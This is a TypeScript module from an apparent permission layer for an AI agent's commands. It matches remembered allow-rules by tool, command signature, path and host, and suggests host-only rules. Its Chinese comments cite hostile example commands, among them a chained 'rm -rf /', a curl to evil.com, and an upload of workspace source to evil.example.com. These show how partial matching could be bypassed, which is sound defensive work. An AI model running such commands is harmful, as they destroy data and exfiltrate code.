import type { Normalized } from "./classify.js"
import { isInside } from "./path.js"
import type { Request, Rule, RulePattern } from "./types.js"
import type { Locale } from "@switchback/i18n"
import { FALLBACK_LOCALE } from "./locale.js"
import { MEMORY } from "./memory.messages.js"

interface MatchInput {
  norm: Normalized
  req: Request
  pattern: RulePattern
}

function matchesTool({ req, pattern }: MatchInput): boolean {
  return pattern.tool === undefined || pattern.tool === req.tool
}

function matchesSignature({ norm, pattern }: MatchInput): boolean {
  if (pattern.commandSignature === undefined) return true
  if (norm.signatures.length === 0) return false
  // 所有命令段都要匹配——`pnpm test && rm -rf /` 不能因为第一段匹配就整体放行
  return norm.signatures.every((s) => s === pattern.commandSignature)
}

function matchesPath({ norm, pattern }: MatchInput): boolean {
  if (pattern.pathPrefix === undefined) return true
  if (norm.paths.length === 0) return false
  return norm.paths.every((p) => isInside(pattern.pathPrefix as string, p))
}

function matchesHost({ norm, pattern }: MatchInput): boolean {
  if (pattern.host === undefined) return true
  if (norm.hosts.length === 0) return false
  return norm.hosts.every((h) => h === pattern.host)
}

/**
 * 找出第一条匹配的记忆规则。
 *
 * 匹配语义是**全称的**：命令、路径、host 必须**全部**落在规则范围内才算命中。
 * 存在量词会让 `pnpm test && curl evil.com` 因为前半段匹配而整体放行。
 */
export function matchMemory(
  norm: Normalized,
  req: Request,
  rules: readonly Rule[],
): Rule | undefined {
  return rules.find((rule) => {
    const input: MatchInput = { norm, req, pattern: rule.pattern }
    return (
      matchesTool(input) && matchesSignature(input) && matchesPath(input) && matchesHost(input)
    )
  })
}

/**
 * 为一次 escalate 生成「以后自动允许」的建议规则。给不出安全的模式就返回 undefined。
 *
 * ## 只剩 host 一种，这是修完 bug 之后的结果
 *
 * 原来还有一条「记住命令签名」（`{commandSignature:"curl"}`）。查下来它
 * **只有通过一个 bug 才走得到**：可记忆的红线全仓只有 `network` 一条，
 * 而 `curl https://x` 走的是 Bash（category = exec 不是 net），
 * 于是网络红线命中之后落进了签名分支——
 * 卡片上问的是「网络访问需要确认目标主机」，记下的却是**无 host 约束的
 * 任意 curl**。用户以为放行了一个域名，实际放行的是
 * `curl -T 工作区源码 https://evil.example.com`，而且 project 级落盘、跨重启有效。
 *
 * 把网络场景改成强制记 host 之后，签名分支再没有任何入口
 *（信任档矩阵里 exec 从来不是 escalate：只读拒绝、其余放行），
 * 所以直接删掉。**将来真要加「记住这条命令」，得先有一条 memorable 的 exec 红线，
 * 那时连同它的用例一起加回来。** 留着一段只有 bug 能触发的代码是给后人挖坑。
 *
 * @param redline 这次命中的是哪条红线。问的是什么，就得记什么。
 */
export function suggestRule(norm: Normalized, redline?: string, locale: Locale = FALLBACK_LOCALE): Rule | undefined {
  const host = norm.hosts[0]
  // 多个主机（或一个都认不出）时**不给建议**：记一条模糊的规则比不记糟得多
  if (host === undefined || norm.hosts.length !== 1) return undefined
  if (redline !== "network" && norm.category !== "net") return undefined
  return {
    id: `host:${host}`,
    describe: MEMORY[locale].allowHost(host),
    pattern: { host },
    scope: "project",
  }
}
